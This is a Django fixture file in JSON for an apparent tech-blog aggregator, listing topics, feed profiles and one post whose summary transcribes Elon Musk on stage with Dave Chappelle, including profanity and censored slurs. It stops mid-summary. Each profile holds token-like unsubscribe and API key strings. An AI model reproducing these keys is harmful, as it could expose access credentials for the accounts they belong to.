[{"model": "app.category", "pk": 1, "fields": {"name": "Domain"}}, {"model": "app.category", "pk": 2, "fields": {"name": "Language"}}, {"model": "app.category", "pk": 3, "fields": {"name": "Raw"}}, {"model": "app.topic", "pk": 1, "fields": {"display_name": "Decentralized Web", "category": 1, "slug": "decentralized-web", "updated_on": "2023-08-12T22:29:32.674Z", "is_popular": false, "recommended": [10, 13]}}, {"model": "app.topic", "pk": 2, "fields": {"display_name": "App Development", "category": 1, "slug": "app-development", "updated_on": "2023-08-12T22:29:32.676Z", "is_popular": false, "recommended": [3, 9, 11]}}, {"model": "app.topic", "pk": 3, "fields": {"display_name": "Startups", "category": 1, "slug": "startups", "updated_on": "2023-08-12T22:29:32.677Z", "is_popular": false, "recommended": [1]}}, {"model": "app.topic", "pk": 4, "fields": {"display_name": "Open Source", "category": 1, "slug": "open-source", "updated_on": "2023-08-12T22:31:17.441Z", "is_popular": true, "recommended": [11, 13]}}, {"model": "app.topic", "pk": 5, "fields": {"display_name": "Networking", "category": 1, "slug": "networking", "updated_on": "2023-08-12T22:29:32.678Z", "is_popular": false, "recommended": [9, 11]}}, {"model": "app.topic", "pk": 6, "fields": {"display_name": "Engineering Team Blogs", "category": 1, "slug": "engineering-team-blogs", "updated_on": "2023-08-12T22:29:32.679Z", "is_popular": false, "recommended": [3, 9, 11]}}, {"model": "app.topic", "pk": 7, "fields": {"display_name": "Computer Science Theory", "category": 1, "slug": "computer-science-theory", "updated_on": "2023-08-12T22:29:32.679Z", "is_popular": false, "recommended": [7]}}, {"model": "app.topic", "pk": 8, "fields": {"display_name": "Distributed Systems", "category": 1, "slug": "distributed-systems", "updated_on": "2023-08-12T22:29:54.040Z", "is_popular": true, "recommended": [2, 3, 9, 11]}}, {"model": "app.topic", "pk": 9, "fields": {"display_name": "Machine Learning", "category": 1, "slug": "machine-learning", "updated_on": "2023-08-12T22:29:57.729Z", "is_popular": true, "recommended": [3, 8, 11, 12]}}, {"model": "app.topic", "pk": 10, "fields": {"display_name": "Programming Languages", "category": 1, "slug": "programming-languages", "updated_on": "2023-08-12T22:29:32.681Z", "is_popular": false, "recommended": [11]}}, {"model": "app.topic", "pk": 11, "fields": {"display_name": "Cryptocurrency", "category": 1, "slug": "cryptocurrency", "updated_on": "2023-08-12T22:29:32.682Z", "is_popular": false, "recommended": [6, 10]}}, {"model": "app.topic", "pk": 12, "fields": {"display_name": "System Programming", "category": 1, "slug": "system-programming", "updated_on": "2023-08-12T22:29:32.683Z", "is_popular": false, "recommended": [7, 9]}}, {"model": "app.topic", "pk": 13, "fields": {"display_name": "Hardware", "category": 1, "slug": "hardware", "updated_on": "2023-08-12T22:29:32.683Z", "is_popular": false, "recommended": [7, 9]}}, {"model": "app.topic", "pk": 14, "fields": {"display_name": "Web Development", "category": 1, "slug": "web-development", "updated_on": "2023-08-12T22:29:32.684Z", "is_popular": false, "recommended": [2, 3, 4, 5, 9, 11]}}, {"model": "app.topic", "pk": 15, "fields": {"display_name": "Cybersecurity", "category": 1, "slug": "cybersecurity", "updated_on": "2023-08-12T22:29:32.684Z", "is_popular": false, "recommended": []}}, {"model": "app.topic", "pk": 16, "fields": {"display_name": "Reverse Engineering", "category": 1, "slug": "reverse-engineering", "updated_on": "2023-08-12T22:29:32.685Z", "is_popular": false, "recommended": []}}, {"model": "app.topic", "pk": 17, "fields": {"display_name": "Game Development", "category": 1, "slug": "game-development", "updated_on": "2023-08-12T22:29:32.686Z", "is_popular": false, "recommended": []}}, {"model": "app.topic", "pk": 18, "fields": {"display_name": "Design", "category": 1, "slug": "design", "updated_on": "2023-08-12T22:29:32.686Z", "is_popular": false, "recommended": [3, 9, 11]}}, {"model": "app.topic", "pk": 19, "fields": {"display_name": "Data Science", "category": 1, "slug": "data-science", "updated_on": "2023-08-12T22:29:57.367Z", "is_popular": true, "recommended": [3]}}, {"model": "app.topic", "pk": 20, "fields": {"display_name": "Simulation", "category": 1, "slug": "simulation", "updated_on": "2023-08-12T22:29:32.687Z", "is_popular": false, "recommended": []}}, {"model": "app.topic", "pk": 21, "fields": {"display_name": "Virtual Reality", "category": 1, "slug": "virtual-reality", "updated_on": "2023-08-12T22:29:32.688Z", "is_popular": false, "recommended": []}}, {"model": "app.topic", "pk": 22, "fields": {"display_name": "Travel", "category": 1, "slug": "travel", "updated_on": "2023-08-12T22:29:32.689Z", "is_popular": false, "recommended": []}}, {"model": "app.topic", "pk": 23, "fields": {"display_name": "Music", "category": 1, "slug": "music", "updated_on": "2023-08-12T22:29:32.689Z", "is_popular": false, "recommended": []}}, {"model": "app.topic", "pk": 24, "fields": {"display_name": "Javascript", "category": 2, "slug": "javascript", "updated_on": "2023-08-12T22:29:32.775Z", "is_popular": false, "recommended": [13]}}, {"model": "app.topic", "pk": 25, "fields": {"display_name": "microservices", "category": 3, "slug": "microservices", "updated_on": "2023-08-12T22:29:54.042Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 26, "fields": {"display_name": "engineering", "category": 3, "slug": "engineering", "updated_on": "2023-08-12T22:29:57.368Z", "is_popular": false, "recommended": []}}, {"model": "app.topic", "pk": 27, "fields": {"display_name": "infrastructure", "category": 3, "slug": "infrastructure", "updated_on": "2023-08-12T22:29:56.895Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 28, "fields": {"display_name": "high-availability", "category": 3, "slug": "high-availability", "updated_on": "2023-08-12T22:29:54.049Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 29, "fields": {"display_name": "feature-store", "category": 3, "slug": "feature-store", "updated_on": "2023-08-12T22:29:54.532Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 30, "fields": {"display_name": "big-data", "category": 3, "slug": "big-data", "updated_on": "2023-08-12T22:29:54.534Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 31, "fields": {"display_name": "real-time-analytics", "category": 3, "slug": "real-time-analytics", "updated_on": "2023-08-12T22:29:54.536Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 32, "fields": {"display_name": "technology", "category": 3, "slug": "technology", "updated_on": "2023-08-12T22:29:57.370Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 33, "fields": {"display_name": "data", "category": 3, "slug": "data", "updated_on": "2023-08-12T22:29:54.953Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 34, "fields": {"display_name": "data-governance", "category": 3, "slug": "data-governance", "updated_on": "2023-08-12T22:29:54.955Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 35, "fields": {"display_name": "airbnb", "category": 3, "slug": "airbnb", "updated_on": "2023-08-12T22:29:55.680Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 36, "fields": {"display_name": "http-streaming", "category": 3, "slug": "http-streaming", "updated_on": "2023-08-12T22:29:55.312Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 37, "fields": {"display_name": "web-performance", "category": 3, "slug": "web-performance", "updated_on": "2023-08-12T22:29:55.316Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 38, "fields": {"display_name": "server-side-rendering", "category": 3, "slug": "server-side-rendering", "updated_on": "2023-08-12T22:29:55.319Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 39, "fields": {"display_name": "ios", "category": 3, "slug": "ios", "updated_on": "2023-08-12T22:31:17.089Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 40, "fields": {"display_name": "mobile", "category": 3, "slug": "mobile", "updated_on": "2023-08-12T22:29:56.062Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 41, "fields": {"display_name": "continuous-integration", "category": 3, "slug": "continuous-integration", "updated_on": "2023-08-12T22:29:56.065Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 42, "fields": {"display_name": "ios-app-development", "category": 3, "slug": "ios-app-development", "updated_on": "2023-08-12T22:29:56.067Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 43, "fields": {"display_name": "people", "category": 3, "slug": "people", "updated_on": "2023-08-12T22:29:56.438Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 44, "fields": {"display_name": "leadership", "category": 3, "slug": "leadership", "updated_on": "2023-08-12T22:29:56.441Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 45, "fields": {"display_name": "istio", "category": 3, "slug": "istio", "updated_on": "2023-08-12T22:29:56.899Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 46, "fields": {"display_name": "service-mesh", "category": 3, "slug": "service-mesh", "updated_on": "2023-08-12T22:29:56.901Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 47, "fields": {"display_name": "ai", "category": 3, "slug": "ai", "updated_on": "2023-08-12T22:29:57.728Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 48, "fields": {"display_name": "scalability", "category": 3, "slug": "scalability", "updated_on": "2023-08-12T22:29:57.731Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 49, "fields": {"display_name": "named-entity-recognition", "category": 3, "slug": "named-entity-recognition", "updated_on": "2023-08-12T22:29:57.733Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 50, "fields": {"display_name": "prioritization", "category": 3, "slug": "prioritization", "updated_on": "2023-08-12T22:29:57.734Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 51, "fields": {"display_name": "Video", "category": 3, "slug": "video", "updated_on": "2023-08-12T22:30:11.476Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 52, "fields": {"display_name": "Office Hours", "category": 3, "slug": "office-hours", "updated_on": "2023-08-12T22:30:05.478Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 53, "fields": {"display_name": "Dalton and Michael", "category": 3, "slug": "dalton-and-michael", "updated_on": "2023-08-12T22:30:06.807Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 54, "fields": {"display_name": "YC News", "category": 3, "slug": "yc-news", "updated_on": "2023-08-12T22:30:18.532Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 55, "fields": {"display_name": "videos", "category": 3, "slug": "videos", "updated_on": "2023-08-12T22:30:10.250Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 56, "fields": {"display_name": "Startup School", "category": 3, "slug": "startup-school", "updated_on": "2023-08-12T22:30:11.479Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 57, "fields": {"display_name": "Interview", "category": 3, "slug": "interview", "updated_on": "2023-08-12T22:30:15.284Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 58, "fields": {"display_name": "YC Events", "category": 3, "slug": "yc-events", "updated_on": "2023-08-12T22:30:17.498Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 59, "fields": {"display_name": "Work at a Startup", "category": 3, "slug": "work-at-a-startup", "updated_on": "2023-08-12T22:30:17.501Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 60, "fields": {"display_name": "Batch Stats", "category": 3, "slug": "batch-stats", "updated_on": "2023-08-12T22:30:18.536Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 61, "fields": {"display_name": "blog", "category": 3, "slug": "blog", "updated_on": "2023-08-12T22:30:45.780Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 62, "fields": {"display_name": "talks", "category": 3, "slug": "talks", "updated_on": "2023-08-12T22:30:46.075Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 63, "fields": {"display_name": "ML Applications", "category": 3, "slug": "ml-applications", "updated_on": "2023-08-12T22:31:19.161Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 64, "fields": {"display_name": "Instagram", "category": 3, "slug": "instagram", "updated_on": "2023-08-12T22:31:17.092Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 65, "fields": {"display_name": "Security", "category": 3, "slug": "security", "updated_on": "2023-08-12T22:31:16.920Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 66, "fields": {"display_name": "DevInfra", "category": 3, "slug": "devinfra", "updated_on": "2023-08-12T22:31:17.439Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 67, "fields": {"display_name": "Production Engineering", "category": 3, "slug": "production-engineering", "updated_on": "2023-08-12T22:31:16.919Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 68, "fields": {"display_name": "Android", "category": 3, "slug": "android", "updated_on": "2023-08-12T22:31:17.087Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 69, "fields": {"display_name": "Video Engineering", "category": 3, "slug": "video-engineering", "updated_on": "2023-08-12T22:31:19.162Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 70, "fields": {"display_name": "Connectivity", "category": 3, "slug": "connectivity", "updated_on": "2023-08-12T22:31:17.581Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 71, "fields": {"display_name": "Networking & Traffic", "category": 3, "slug": "networking-traffic", "updated_on": "2023-08-12T22:31:17.287Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 72, "fields": {"display_name": "Events", "category": 3, "slug": "events", "updated_on": "2023-08-12T22:32:11.385Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 73, "fields": {"display_name": "Devconnect", "category": 3, "slug": "devconnect", "updated_on": "2023-08-12T22:31:47.220Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 74, "fields": {"display_name": "Next Billion", "category": 3, "slug": "next-billion", "updated_on": "2023-08-12T22:31:58.194Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 75, "fields": {"display_name": "Research & Development", "category": 3, "slug": "research-development", "updated_on": "2023-08-12T22:32:10.859Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 76, "fields": {"display_name": "Devcon", "category": 3, "slug": "devcon", "updated_on": "2023-08-12T22:32:11.387Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 77, "fields": {"display_name": "Ecosystem Support Program", "category": 3, "slug": "ecosystem-support-program", "updated_on": "2023-08-12T22:32:12.689Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 78, "fields": {"display_name": "Protocol Announcements", "category": 3, "slug": "protocol-announcements", "updated_on": "2023-08-12T22:32:13.354Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 79, "fields": {"display_name": "Ethereum.org", "category": 3, "slug": "ethereumorg", "updated_on": "2023-08-12T22:32:06.177Z", "is_popular": true, "recommended": []}}, {"model": "app.topic", "pk": 80, "fields": {"display_name": "Organizational", "category": 3, "slug": "organizational", "updated_on": "2023-08-12T22:32:09.628Z", "is_popular": true, "recommended": []}}, {"model": "app.userprofile", "pk": 1, "fields": {"extra_data": "", "auth": null, "feed_url": "https://blog.ycombinator.com/feed/", "github_username": "HackerNews", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://blog.ycombinator.com/feed/", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.690Z", "fetched_following_users": false, "is_admin": false, "last_post_date": "2023-08-09T17:39:56Z", "unsubscribe_key": "q3r8xir4l22jaah40k6t4vyipkp8vy4fkuo64h9qss9tc25xv4", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "1x37nguop4f4aulcl18hsa6zqr4g13nxhzw1gz2ykghmzhe7bw", "blog_url_type": 3, "feed_status": 4, "topics": [3], "following": []}}, {"model": "app.userprofile", "pk": 2, "fields": {"extra_data": "", "auth": null, "feed_url": "https://nickcraver.com/blog/feed.xml", "github_username": "NickCraver", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://nickcraver.com/blog/", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.696Z", "fetched_following_users": false, "is_admin": false, "last_post_date": "2020-02-11T00:00:00Z", "unsubscribe_key": "2htcksw6qyz9bjh4sty05h7y4a40rl3an0f003aj7y9i0xpn0k", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "3gjbz5344wlwqizvrngitvutnr7wqqgljcdwewrrlf4zzdr6g9", "blog_url_type": 3, "feed_status": 4, "topics": [8, 14], "following": []}}, {"model": "app.userprofile", "pk": 3, "fields": {"extra_data": "", "auth": null, "feed_url": "https://medium.com/feed/airbnb-engineering", "github_username": "airbnb", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://medium.com/airbnb-engineering", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.702Z", "fetched_following_users": false, "is_admin": false, "last_post_date": "2023-07-25T18:46:01Z", "unsubscribe_key": "bo3gt4sswksmujyvnggqa2oibzlp8tm8g94riwo935l9ogarag", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "mjhdxt2jh7x0slbhnh2ei6m0vxg69baw4x2j6zaiu6ifpshq56", "blog_url_type": 3, "feed_status": 4, "topics": [2, 6, 8, 9, 14, 18, 19], "following": []}}, {"model": "app.userprofile", "pk": 4, "fields": {"extra_data": "", "auth": null, "feed_url": "http://antirez.com/rss", "github_username": "antirez", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "http://antirez.com", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.715Z", "fetched_following_users": false, "is_admin": false, "last_post_date": "2022-11-04T18:46:29Z", "unsubscribe_key": "tifrkgmldv0zk913whzqcbbgly5ktypn2zidmgtddehpgwje48", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "6eazmvz62tt7tefn56gdbdjwlngqw7iggb8bzru4vm2f6wqkds", "blog_url_type": 3, "feed_status": 4, "topics": [14], "following": []}}, {"model": "app.userprofile", "pk": 5, "fields": {"extra_data": "", "auth": null, "feed_url": "https://blog.codinghorror.com/rss/", "github_username": "coding-horror", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://blog.codinghorror.com/", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.718Z", "fetched_following_users": false, "is_admin": false, "last_post_date": "2022-03-04T18:53:32Z", "unsubscribe_key": "urgr3cd3lazcplalljg8vx084pw8h5fyaa83klmbqzlhjb6mc6", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "mkg9ypjakp9y38iux537j0b5o87q3adbm0ojz6e9jor0xzzmsa", "blog_url_type": 3, "feed_status": 4, "topics": [14], "following": []}}, {"model": "app.userprofile", "pk": 6, "fields": {"extra_data": "", "auth": null, "feed_url": "", "github_username": "coinbase", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://blog.coinbase.com/feed", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.721Z", "fetched_following_users": false, "is_admin": false, "last_post_date": null, "unsubscribe_key": "47umwa9s4cxsq56jowgq6mjqs2oykt9nluagfar0xto8pskoa5", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "jiza8a2706y8307m5p5zctmvsmhsj0jqi8cxuua65s3ds2e823", "blog_url_type": null, "feed_status": null, "topics": [11], "following": []}}, {"model": "app.userprofile", "pk": 7, "fields": {"extra_data": "", "auth": null, "feed_url": "https://danluu.com/atom.xml", "github_username": "danluu", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://danluu.com/", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.724Z", "fetched_following_users": false, "is_admin": false, "last_post_date": null, "unsubscribe_key": "lf5ypog1gksgnhz5wzyj0vgpwkh1pt2153zqst67neyswismu1", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "jhiwlwag96l87ywypb7x5qsmawaj0vd2ixpe9a18hjkdte01jz", "blog_url_type": 3, "feed_status": null, "topics": [7, 12, 13], "following": []}}, {"model": "app.userprofile", "pk": 8, "fields": {"extra_data": "", "auth": null, "feed_url": "https://deepmind.com/blog/feed/basic/", "github_username": "deepmind", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://deepmind.com/blog/feed/basic/", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.730Z", "fetched_following_users": false, "is_admin": false, "last_post_date": "2023-07-28T00:00:00Z", "unsubscribe_key": "y54m85rex8ynepnrcunobzbahibbwjsjyqmpsccdgfdw5qfdne", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "rohje3xqmcgbui6usu4p36x838qp96o2ycmxt0bz1ntfoabdxt", "blog_url_type": 3, "feed_status": 4, "topics": [9], "following": []}}, {"model": "app.userprofile", "pk": 9, "fields": {"extra_data": "", "auth": null, "feed_url": "https://blogs.dropbox.com/tech/feed/", "github_username": "dropbox", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://blogs.dropbox.com/tech/feed/", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.733Z", "fetched_following_users": false, "is_admin": false, "last_post_date": null, "unsubscribe_key": "6gvxs3x9i4dsmb3vanmb8tgwxafy30ik6zqx3ojjvpun4ay19e", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "pvka7vkuypzpaikfm47fmzv5168okcq2w26wz67n859q55ldsp", "blog_url_type": 3, "feed_status": null, "topics": [2, 5, 6, 8, 12, 13, 14, 18], "following": []}}, {"model": "app.userprofile", "pk": 10, "fields": {"extra_data": "", "auth": null, "feed_url": "https://blog.ethereum.org/en/feed.xml", "github_username": "ethereum", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://blog.ethereum.org/", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.748Z", "fetched_following_users": false, "is_admin": false, "last_post_date": "2023-08-08T00:00:00Z", "unsubscribe_key": "dkf5m7js6ywnfzavyb7lfvshq6r1ep0x6hajd7wwr9e75recjw", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "i20e4pqsti8rgyaiz51np5vudr65uf21zhir5rh6d42ew2g95a", "blog_url_type": 3, "feed_status": null, "topics": [1, 11], "following": []}}, {"model": "app.userprofile", "pk": 11, "fields": {"extra_data": "", "auth": null, "feed_url": "https://code.fb.com/feed/", "github_username": "facebook", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://code.fb.com/feed/", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.752Z", "fetched_following_users": false, "is_admin": false, "last_post_date": "2023-08-09T16:00:52Z", "unsubscribe_key": "pja35pd9mn90gbyrcusmyu18vmuk1q3a7kaq75vilwav1w8el6", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "cv6hy5ul4u61vznuafzquyglgmscqqaez1g5pv8nthseaarvrw", "blog_url_type": 3, "feed_status": 4, "topics": [2, 4, 5, 6, 8, 9, 10, 14, 18], "following": []}}, {"model": "app.userprofile", "pk": 12, "fields": {"extra_data": "", "auth": null, "feed_url": "https://www.fast.ai/index.xml", "github_username": "fastai", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://www.fast.ai/atom.xml", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.768Z", "fetched_following_users": false, "is_admin": false, "last_post_date": null, "unsubscribe_key": "v9nbmyzhoepjk5c5toznqnr0kuprts1d2gd64isiugnx0vm18f", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "2pfn9nv82kh682nwtyc8b4nz65cw8o8a356j6sk8f83maq45ln", "blog_url_type": 3, "feed_status": null, "topics": [9], "following": []}}, {"model": "app.userprofile", "pk": 13, "fields": {"extra_data": "", "auth": null, "feed_url": "https://feross.org/atom.xml", "github_username": "feross", "github_id": null, "github_token": null, "is_activated": false, "full_name": "", "followers_count": null, "following_count": null, "blog_url": "https://feross.org/", "website_url": null, "bio": null, "company": null, "location": null, "twitter_username": null, "is_organization": null, "created_on": "2023-08-12T22:29:32.771Z", "fetched_following_users": false, "is_admin": false, "last_post_date": null, "unsubscribe_key": "t6wua57hn6cyzhfplauvjlqdft56jpgnupj61qbbostjk8s2mn", "send_weekly_digest_email": true, "pocket_api_key": null, "pocket_show_button": true, "pocket_auto_save": false, "plugin_public_api_key": "cmm77fnli5adhr9bhxkblbqinbbud2g8rry9t7y10x6wgqfeev", "blog_url_type": 3, "feed_status": null, "topics": [1, 4, 24], "following": []}}, {"model": "app.post", "pk": 1, "fields": {"title": "Transcript of Elon Musk on stage with Dave Chapelle", "link": "https://danluu.com/elon-dave-chappelle/", "source": 1, "normalized_link": "danluu.com/elon-dave-chappelle", "summary": "This is a transcription of videos Elon Musk's appearance on stage with Dave Chapelle using OpenAI's Whisper model with some manual error corrections and annotations for crowd noise. As with the Exhibit H Twitter text message release, there are a lot of articles that quote bits of this, but the articles generally missing a lot of what happened and often paint a misleading picture of happened and the entire thing is short enough that you might as well watch or read it instead of reading someone's misleading summary. In general, the media seems to want to paint a highly unflattering picture of Elon, resulting in articles and virtual tweets that are factually incorrect. For example, it's been widely incorrectly reported that, during the \"I'm rich, bitch\" part, horns were played to drown out the crowd's booing of Elon, but the horn sounds were played when the previous person said the same thing, which was the most cheered statement that was recorded. The sounds are much weaker when Elon says \"I'm rich, bitch\" and can't be heard clearly, but it sounds like a mix of booing and cheering. It was probably the most positive crowd response that Elon got from anything and it seems inaccurate in at least two ways to say that horns were played to drown out the booing Elon was receiving. On the other hand, even though the media has tried to paint as negative a picture of Elon as possible, it's done quite a poor job and a boring, accurate, accounting of what happened in many of other sections are much less flattering than the misleading summaries that are being passed around.  Video 1  Dave:  Ladies and gentlemen, make some noise for the richest man in the world. Crowd: [mixed cheering, clapping, and boos; boos drown out cheering and clapping after a couple of seconds and continue into next statements] Dave: Cheers and boos, I say Crowd: [brief laugh, boos continue to drown out other crowd noise] Dave: Elon Crowd: [booing continues] Elon: Hey Dave Crowd: [booing intensifies] Elon: [unintelligible over booing] Dave: Controversy, buddy. Crowd: [booing continues; some cheering can be heard] Elon: Weren't expecting this, were ya? Dave: It sounds like some of them people you fired are in the audience. Crowd: [laughs, some clapping can be heard] Elon: [laughs] Crowd: [booing resumes] Dave: Hey, wait a minute. Those of you booing Crowd: [booing intensifies] Dave: Tough [unintelligible due to booing] sounds like Elon: [unintelligible due to being immediately cut off by Dave] Dave: You know there's one thing. All those people are booing. I'm just. I'm just pointing out the obvious. They have terrible seats. [unintelligible due to crowd noise] Crowd: [weak laughter] Dave: All coming from wayyy up there [unintelligible] last minute non-[unintelligible] n*****. Booo. Booooooo. Crowd: [quiets down] Dave: Listen. Crowd: [booing resumes] Dave: Whatever. Look motherfuckas. This n**** is not even trying to die on earth Crowd: [laughter mixed with booing, laughter louder than boos]  Video 2  Dave: His whole business model is fuck earth I'm leaving anyway Crowd: [weak laughter, weak mixed sounds] Dave: Do all you want. Take me with you n**** I'm going to Mars Crowd: [laughter] Dave: Whatever kind of pussy they got up there, that's what we'll be doin Crowd: [weak laughter] Dave: [laughs] Anti-gravity titty bars. Follow your dreams bitch and the money just flow all over the room Crowd: [weak laughter] Elon: [laughs] Crowd: [continued laughter drowned out by resumed booing; some cheering can be heard] Elon: Thanks for, uhh, thanks for having me on stage. Dave: Are you kidding. I wouldn't miss this opportunity. Elon: [unintelligible, cut off by crowd laughter] Crowd: [laughter] Elon: [unintelligible, cut off by crowd laughter] Dave: The first comedy club on Mars that should be my [pause for crowd laughter] a deal's a deal, Musk. Crowd: [weak laughter and cheering] Elon: [unintelligible], yeah Dave: You n***** can boo all you want. This n**** gave me a jet pack last Christmas Crowd: [laughter] Dave: Fly right past your house. They can boo these nuts [unintelligible due to laughter at this line] Dave: That's how we like to chill, we do all the shit Crowd: [weak laughter, shifting to crowd talking] Elon: [Elon shifts, as if to address crowd] Crowd: [booing resumes] Elon: Dave, what should I say? Crowd: [booing intensifies] Dave: Don't say nothin. It'll only spoil the moment. Do you hear that sound Elon? That's the sound of pending civil unrest. Crowd: [weak laughter, some booing can initially be heard; booing intensifies until Dave cuts it off with his next line] Dave: I can't wait to see which story you decimate next motherfucka [unintelligible] you shut the fuck up with your boos. There's something better that you can do. Booing is not the best thing that you can do. Try it n****.  Make it what you want it to be. I am your ally. I wish everybody in this auditorium peace and the joy of feeling free and your pursuit of happiness make you 